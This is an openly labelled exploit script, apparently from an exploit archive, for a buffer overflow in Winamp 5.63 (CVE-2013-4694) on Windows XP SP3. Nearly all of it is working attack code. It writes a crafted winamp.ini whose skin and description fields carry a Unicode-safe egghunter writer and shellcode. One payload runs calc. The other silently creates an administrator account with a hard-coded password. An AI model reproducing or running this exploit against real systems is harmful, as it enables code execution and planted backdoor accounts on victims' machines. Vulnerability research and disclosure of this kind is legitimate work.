# Exploit Title: winampevilskin.py
# Date: 25 August 2013
# Exploit Author: Ayman Sagy <aymansagy@gmail.com>
# Vendor Homepage: http://www.winamp.com/
# Version: 5.63
# Tested on: Windows XP Professional SP3 Version 2002
# CVE : 2013-4694
#
# Ayman Sagy <aymansagy@gmail.com> August 2013
#
# This is an exploit for Bug #1 described in http://www.exploit-db.com/exploits/26558/
# Credit for discovering the vulnerability goes to Julien Ahrens from Inshell Security
# 
# The exploit will generate a winamp.ini file that will cause winamp to run the payload upon startup
#
#
# I tried an alpha3 encoded egghunter but could not fit it in a single buffer and unfortunately it did not work, it wrote an invalid address on the stack then tried to access it
# If you can make it work or find a solution for ASLR/DEP please contact me
# 
# So I wrote from scratch a venetian shellcode that will write the egghunter onto the stack then executes it
# The egg and shellcode can be found in plain ASCII in memory
#
# Tested against Windows XP Pro SP3
# Note: If you add winamp as an exception to DEP the return address becomes 0x003100F0 instead of 0x003000F0
# run with Python 2.7

import sys, getopt, os

def usage():
      print('winampevilskin.py by Ayman Sagy <aymansagy@gmail.com>\n')
      print('Usage: python ' + sys.argv[0] + ' -p <payload>')
      print('Payload could be:')
      print('\t[user] to create new admin account ayman/P@ssw0rd')
      print('\t[calc] run calculator')
      print('for e.g.: python ' + sys.argv[0] + ' -p user')


#appdata = os.environ['APPDATA']


# Windows add admin user: ayman P@ssw0rd
scadduser = ( b"\xbf\xab\xd0\x9a\x5b\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x45\x83\xc2\x04\x31\x7a\x11\x03\x7a\x11\xe2\x5e\x2c" +
"\x72\xd2\xa0\xcd\x83\x85\x29\x28\xb2\x97\x4d\x38\xe7\x27" +
"\x06\x6c\x04\xc3\x4a\x85\x9f\xa1\x42\xaa\x28\x0f\xb4\x85" +
"\xa9\xa1\x78\x49\x69\xa3\x04\x90\xbe\x03\x35\x5b\xb3\x42" +
"\x72\x86\x3c\x16\x2b\xcc\xef\x87\x58\x90\x33\xa9\x8e\x9e" +
"\x0c\xd1\xab\x61\xf8\x6b\xb2\xb1\x51\xe7\xfc\x29\xd9\xaf" +
"\xdc\x48\x0e\xac\x20\x02\x3b\x07\xd3\x95\xed\x59\x1c\xa4" +
"\xd1\x36\x23\x08\xdc\x47\x64\xaf\x3f\x32\x9e\xd3\xc2\x45" +
"\x65\xa9\x18\xc3\x7b\x09\xea\x73\x5f\xab\x3f\xe5\x14\xa7" +
"\xf4\x61\x72\xa4\x0b\xa5\x09\xd0\x80\x48\xdd\x50\xd2\x6e" +
"\xf9\x39\x80\x0f\x58\xe4\x67\x2f\xba\x40\xd7\x95\xb1\x63" +
"\x0c\xaf\x98\xe9\xd3\x3d\xa7\x57\xd3\x3d\xa7\xf7\xbc\x0c" +
"\x2c\x98\xbb\x90\xe7\xdc\x34\xdb\xa5\x75\xdd\x82\x3c\xc4" +
"\x80\x34\xeb\x0b\xbd\xb6\x19\xf4\x3a\xa6\x68\xf1\x07\x60" +
"\x81\x8b\x18\x05\xa5\x38\x18\x0c\xc6\xd3\x82\x81\x6d\x54" +
"\x2e\xfe\x42\xc7\x90\x90\xf9\x73\xf1\x19\x72\x19\x83\xc1" +
"\x15\x98\x0e\x63\xbb\x7a\x81\x23\x30\x08\x56\x94\xc4\x8a" +
"\xb8\xfb\x69\x17\xfd\x23\x4f\xb1\xdd\x4d\xea\xc9\x3d\xfe" +
"\x9b\x52\x5f\x92\x04\xe7\xf0\x1f\xba\x27\x4e\x84\x57\x41" +
"\x3e\x2d\xd4\xe5\xcc\xcc\x6e\x69\x43\x7c\xae\x14\xda\xef" +
"\xcf\xb8\x3c\xdf\x4e\x01\x79\x1f"
)

# http://shell-storm.org/shellcode/files/shellcode-739.php
sccalc = (b"\x31\xC9"+                # xor ecx,ecx
        "\x51"+                    # push ecx        
        "\x68\x63\x61\x6C\x63"+    # push 0x636c6163        
        "\x54"+                    # push dword ptr esp        
        "\xB8\xC7\x93\xC2\x77"+    # mov eax,0x77c293c7        
        "\xFF\xD0"
          )

if len(sys.argv) < 2:
      usage()
      exit(1)

try:
      opts, args = getopt.getopt(sys.argv[1:],'p:')
except getopt.GetoptError:
      usage()
      exit(1)
for opt, arg in opts:
      if opt == '-p':
            if arg == 'user':
                  shellcode = "aymnaymn" + "\x90" + "\x90" * 100 + scadduser + "\x90" * 89
            elif arg == "calc":
                  shellcode = "aymnaymn" + b"\x90" * 452 + b"\x90" + sccalc + b"\x90" * 23
            else:
                  print("Error: Invalid payload.\n")
                  usage()
                  sys.exit()


#print(str(len(shellcode)))

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"+
"\xef\xb8\x61\x79\x6d\x6e\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

sploit = ( # Unicode-friendly venetian egghunter writer
                                    # Setup Registers
           "\x50\x72\x50"+          # push eax twice
           "\x72" +                 # align
           "\x59\x72\x5f"+          # pop ecx pop edi
           "\x72" +
           "\x05\xc2\x02\x01"+      # 05 00020001      ADD EAX,1000200
           "\x72"+
           "\x2d\xc2\x01\x01"+      # 2D 00010001      SUB EAX,1000100
                                    # EAX is now EAX+100
           "\x72\x48"+      # dec eax 4 times
           "\x72\x48"+
           "\x72\x48"+
           "\x72\x48\x72"+
                                    # Pave Ahead
                                    # write NOPs in locations that will stop later execution
           "\xc3\x86\xc2\x90"+      # C600 90          MOV BYTE PTR DS:[EAX],90
           "\x72\x40\x72"+          # 40               INC EAX
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x90"+
           "\x72\x40\x72"+
           
           "\xc2\x91"               # 91               XCHG EAX,ECX
           "\x72" +                 # align           
                                    # Start writing egghunter shellcode, EGG = aymn
           "\xc3\x86\x66"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x81"+ #81
           "\x72\x40\x72"+
           "\xc3\x86\xc3\x8a"+ #ca
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xbf"+
           "\x72\x40\x72"+
           "\xc3\x86\x0f"+
           "\x72\x40\x72"+
           "\xc3\x86\x42"+ # 42
           "\x72\x40\x72"+
           "\xc3\x86\x52"+
           "\x72\x40\x72"+
           "\xc3\x86\x6a"+
           "\x72\x40\x72"+
           "\xc3\x86\x02"+
           "\x72\x40\x72"+
           
           "\x34" * 4 +             # Padding
           "\xc3\xb0\x30"+          # 0x003000F0  CALL EAX winamp.exe WinXP Pro SP3
                                    # Note: If you add winamp as an exception to DEP the return address becomes 0x003100F0 instead of 0x003000F0

           "\x72"
           "\xc3\x86\x58"+ #58
           "\x72\x40\x72"+
           "\xc3\x86\xc3\x8d"+ #cd
           "\x72\x40\x72"+
           "\xc3\x86\x2e"+ #2e
           "\x72\x40\x72"+
           "\xc3\x86\x3c"+ # 3c
           "\x72\x40\x72"+
           "\xc3\x86\x05"+ # 5
           "\x72\x40\x72"+
           "\xc3\x86\x5a"+
           
           "\x72\x40\x72"+
           "\xc3\x86\x74"+
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xaf"+ # ef
           "\x72\x40\x72"+
           "\xc3\x86\xc2\xb8"+
           "\x72\x40\x72"+
           "\xc3\x86\x61"+
           "\x72\x40\x72"+
           "\xc3\x86\x79"+
           "\x72\x40\x72"+
           "\xc3\x86\x6d"+
           "\x72\x40\x72"+
           "\xc3\x86\x6e"+
           "\x72\x40\x72"+
           "\xc3\x86\xc2\x8b"+
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xba"+ #fa
           "\x72\x40\x72"+
           "\xc3\x86\xc2\xaf"+ # af
           "\x72\x40\x72"+
           "\xc3\x86\x75"+ #75
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xaa"+ #ea
           "\x72\x40\x72"+
           "\xc3\x86\xc2\xaf"+ # af
           "\x72\x40\x72"+
           "\xc3\x86\x75"+ #75
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xa7"+ # e7
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xbf"+ # ff
           "\x72\x40\x72"+
           "\xc3\x86\xc3\xa7"+ # e7
           "\x72"+
           "\x57"+                  # 57               PUSH EDI
           "\x72"+                  # align
           "\xc3\x83"+              # C3               RETN
           "\x34" * 200             # Padding
    )



winamp = ("[Winamp]\r\nutf8=1\r\n" +
"skin=" + sploit + "\r\n"
"[WinampReg]\r\nIsFirstInst=0\r\nNeedReg=0\r\n" +
          "[in_wm]\r\nnumtypes=7\r\n" +
          "type0=WMA\r\ndescription0=Windows Media Audio File (*.WMA)\r\n" +
          "protocol0=0\r\navtype0=0\r\n" +
          "type1=WMV\r\ndescription1=Windows Media Video File (*.WMV)\r\n" +
          "protocol1=0\r\navtype1=1\r\ntype2=ASF\r\n" +
          "description2=Advanced Streaming Format (*.ASF)\r\n" +
          "protocol2=0\r\navtype2=1\r\ntype3=MMS://\r\n" +
          "description3=Windows Media Stream\r\nprotocol3=1\r\n" +
          "avtype3=1\r\ntype4=MMSU://\r\n"
          "description4=Windows Media Stream\r\nprotocol4=1\r\n" +
          "avtype4=1\r\ntype5=MMST://\r\n" +
          "description5=Windows Media Stream\r\nprotocol5=1\r\n" +
          "avtype5=1\r\ntype5=" + "\x90\x90\xe9\x0f" + "\r\ndescription6=" +
          shellcode  + "\r\nprotocol6=0\r\navtype6=0\r\n")

#f = open(appdata + "\Winamp\winamp.ini", "wb") or sys.exit("Error creating winamp.ini")
f = open("winamp.ini", "wb") or sys.exit("Error creating winamp.ini")
f.write(winamp)
f.close()

print("winamp.ini written, copy it into %APPDATA%\\Winamp")